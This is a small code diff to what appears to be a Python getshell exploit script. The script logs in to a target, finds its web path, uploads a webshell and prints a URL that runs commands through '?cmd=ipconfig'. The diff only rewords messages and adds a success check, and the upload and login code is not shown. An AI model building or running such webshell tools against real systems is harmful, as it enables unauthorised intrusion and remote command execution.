@@ -78,7 +78,7 @@ def get_path():
 def main():
     
     if not login():
-        print('login error.')
+        print('login failed.')
         return False
     
     web_path = get_path()
@@ -89,9 +89,11 @@ def main():
     
     if web_path:
         webshell = upload_file(web_path)
-        print('webshell: (GET) {}?cmd=ipconfig'.format(webshell))
-    else:
-        print('getshell failed.')
+        if webshell:
+            print('webshell: (GET) {}?cmd=ipconfig'.format(webshell))
+            return True
+    
+    print('getshell failed.')
 
 
 if __name__ == '__main__':
